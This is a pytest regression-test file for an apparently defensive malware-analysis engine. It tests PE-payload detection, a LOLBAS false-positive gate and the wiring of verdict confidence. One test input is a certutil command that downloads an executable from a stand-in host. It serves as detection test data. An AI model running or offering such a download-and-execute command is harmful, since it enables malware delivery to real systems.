"""RC3.1.1 hotfix batch regression tests.

Locks the five production-observed bugs discovered during the RC3.1
field-test so a refactor cannot silently reintroduce any of them.
"""
from __future__ import annotations

import base64

import pytest

import decoders  # noqa: F401
from engine import AnalysisContext, Budget, Orchestrator


def _make_pe(e_lfanew: int = 0x80) -> bytes:
    """Synthetic Windows PE binary — MZ header, correct e_lfanew, PE\\0\\0."""
    b = bytearray()
    b += b"MZ"
    b += b"\x90" * (0x3c - 2)
    b += e_lfanew.to_bytes(4, "little")
    b += b"\x00" * (e_lfanew - 0x40)
    b += b"PE\x00\x00"
    b += b"\x00" * 500
    return bytes(b)


# --------------------------------------------------------------------
# PROD-BUG-6 · PE-executable-payload tradecraft surfaces
# --------------------------------------------------------------------

def test_prod_bug_6_pe_payload_surfaces_tradecraft():
    """Base64-wrapped PE binary must surface pe-executable-payload flag
    plus T1204.002 + T1105 MITRE techniques."""
    sample = base64.b64encode(_make_pe()).decode()
    r = Orchestrator(AnalysisContext(budget=Budget(wall_time_ms=8000))).run(sample)
    flags = {t.flag for t in r.findings.tradecraft}
    assert "pe-executable-payload" in flags, (
        f"missing pe-executable-payload flag; got {sorted(flags)}"
    )
    pe_flag = next(t for t in r.findings.tradecraft if t.flag == "pe-executable-payload")
    assert pe_flag.severity == "high"
    assert pe_flag.metadata.get("format") == "PE"
    assert pe_flag.metadata.get("e_lfanew") == 0x80
    mitre_ids = {h.id for h in r.findings.mitre_techniques}
    assert "T1204.002" in mitre_ids
    assert "T1105" in mitre_ids
    assert r.findings.verdict == "malicious"


# --------------------------------------------------------------------
# PROD-BUG-2 · LOLBAS FP gate on garbled binary tail
# --------------------------------------------------------------------

def test_prod_bug_2_lolbas_gate_on_binary_tail():
    """Garbled binary noise (printable-ratio < 0.60) must NOT trigger the
    post-decode LOLBAS scanner, which was the root cause of Control.exe /
    Remote.exe false-positives on decoded PE tails."""
    from engine.orchestrator import _printable_ratio_bytes, _post_decode_lolbas_scan
    from engine.models import Findings

    # 100% binary noise
    noise = "".join(chr(i % 256) for i in range(0, 500))
    assert _printable_ratio_bytes(noise) < 0.60

    findings = Findings()
    _post_decode_lolbas_scan(findings, noise, "")   # raw_input empty too
    assert len(findings.lolbas) == 0, (
        "LOLBAS scanner should refuse a binary-noise-only surface"
    )


def test_prod_bug_2_lolbas_still_scans_clean_input():
    """The gate must NOT starve legitimate clean-input scans — LOLBAS
    scanner still fires when at least the RAW input is printable."""
    from engine.orchestrator import _post_decode_lolbas_scan
    from engine.models import Findings

    findings = Findings()
    _post_decode_lolbas_scan(
        findings,
        final_output="".join(chr(i % 256) for i in range(500)),   # binary noise
        raw_input="cmd.exe /c certutil.exe -urlcache http://x.com/p.exe",
    )
    binaries = {h.binary.lower() for h in findings.lolbas}
    assert "certutil.exe" in binaries, f"expected certutil.exe, got {binaries}"


# --------------------------------------------------------------------
# PROD-BUG-1 · Verdict / confidence unification (frontend + backend)
# --------------------------------------------------------------------

def test_prod_bug_1_investigation_summary_uses_verdict_card_score():
    """`ops.py:decode_smart` must feed the Investigation Summary
    `confidence` from `verdict_card.risk_score`, NOT the deterministic
    engine's decode-confidence (which returns 0 for a plain base64→PE
    decode).

    Regression-locked via source-diff: any refactor that removes the
    verdict-card-first confidence resolution logic will fail this test.
    """
    src = open("/app/backend/routers/ops.py").read()
    # The hotfix block must remain wired
    assert "PROD-BUG-1" in src, (
        "ops.py lost the PROD-BUG-1 hotfix comment — verdict-card first "
        "confidence resolution may have been removed"
    )
    # verdict_card score must be preferred
    assert "vc_score = vc.get(\"risk_score\") or vc.get(\"score\")" in src, (
        "ops.py no longer prefers verdict_card.risk_score for summary_confidence"
    )
    assert "summary_confidence = vc_score" in src


def test_prod_bug_1_threat_analysis_prefers_verdict_card():
    """Regression lock for the ThreatAnalysis.jsx source — the component
    MUST reference verdict_card before falling back to legacy `risk`."""
    src = open("/app/frontend/src/components/ThreatAnalysis.jsx").read()
    # New unified block ships this comment string
    assert "verdict tri-state unification" in src, (
        "ThreatAnalysis.jsx no longer prefers verdict_card — PROD-BUG-1 regressed"
    )
    # And still keeps the legacy fallback for old sync-path payloads
    assert "rk.level" in src or "analysis?.risk" in src


# --------------------------------------------------------------------
# PROD-BUG-4 · OUTPUT panel falls back to trace preview when input==output
# --------------------------------------------------------------------

def test_prod_bug_4_output_falls_back_to_trace_preview():
    """Regression lock for WorkspacePage.jsx — the OUTPUT panel MUST
    fall back to the terminal-layer preview when the raw output byte-
    matches the input (canonical PE case)."""
    src = open("/app/frontend/src/pages/WorkspacePage.jsx").read()
    assert "_outEqInput" in src, (
        "WorkspacePage.jsx OUTPUT=INPUT guard was removed — PROD-BUG-4 regressed"
    )
    assert "_lastTraceLayer" in src
